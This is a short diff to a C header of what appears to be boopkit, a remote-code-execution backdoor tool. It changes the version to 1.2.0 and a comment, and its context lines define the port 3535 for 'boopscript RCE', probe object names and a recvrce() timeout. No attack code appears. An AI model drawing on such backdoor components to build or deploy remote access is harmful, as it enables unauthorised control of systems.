@@ -49,7 +49,7 @@ struct event_boop_t {
 };
 
 // VERSION is the semantic version of the program
-#define VERSION "1.1.2"
+#define VERSION "1.2.0"
 
 // PORT for the boopkit TCP protocol for boopscript RCE
 #define PORT 3535
@@ -62,8 +62,7 @@ struct event_boop_t {
 #define PROBE_SAFE   "pr0be.safe.o"
 #define PROBE_XDP    "pr0be.xdp.o"
 
-// TIMEOUT_SECONDS_RECVRCE is the amount of seconds to wait for recvrce()
-// after a boop
+// TIMEOUT_SECONDS_RECVRCE timeout seconds for recvrce()
 #define TIMEOUT_SECONDS_RECVRCE 1
 
 struct pkt_trace_metadata {
